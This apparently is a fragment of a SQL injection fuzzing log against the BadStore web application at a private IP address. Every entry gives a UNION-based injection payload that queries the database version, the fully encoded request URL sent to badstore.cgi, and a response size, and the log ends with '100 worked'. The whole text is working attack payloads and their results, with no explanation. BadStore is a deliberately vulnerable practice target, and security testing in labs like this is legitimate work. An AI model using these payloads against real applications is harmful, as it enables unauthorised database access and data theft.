+sov1U: select * from users where id='1' + @ 1 union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sov1U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%40%201%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	500
+
+sov1o: select * from users where id='1' + @ 1! union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sov1o%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%40%201%21%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	500
+
+sovvU: select * from users where id='1' + @ @1 union select 1,version() -- 1'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=sovvU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%40%20%401%20union%20select%201%2Cversion%28%29%20--%201%27&action=search&x=0&y=0
+	500
+
+svUEs: select * from users where id=1 or 1#"@ union select 'a',version() -- 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=svUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%40%20union%20select%20%27a%27%2Cversion%28%29%20--%201&action=search&x=0&y=0
+	490
+
+s{UEs: select * from users where id=1 or 1#"{ union select 'a',version() -- 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=s%7BUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%7B%20union%20select%20%27a%27%2Cversion%28%29%20--%201&action=search&x=0&y=0
+	490
+
+100 worked
